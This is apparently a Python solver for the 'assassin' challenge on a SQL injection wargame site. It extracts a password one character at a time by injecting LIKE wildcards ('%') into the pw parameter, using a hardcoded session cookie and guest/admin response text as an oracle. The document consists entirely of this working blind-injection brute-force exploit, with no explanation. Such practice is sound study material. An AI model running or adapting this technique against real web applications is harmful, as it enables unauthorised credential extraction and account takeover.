import requests
host = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies = { 'PHPSESSID' : '4aga36tq4r7s71soak2on9vsi3' }

char = ''

while True:
    for j in range(48, 128):
        if '_' in chr(j):
            continue
        query = f"{char+chr(j)}%"
        url = f"{host}?pw={query}"
        r = requests.get(url, cookies = cookies)

        if "Hello admin" in r.text:
            print(f"answer: {char+chr(j)}")
            exit()

        elif "Hello guest" in r.text:
            char += chr(j)
            print(f"current password = {char}")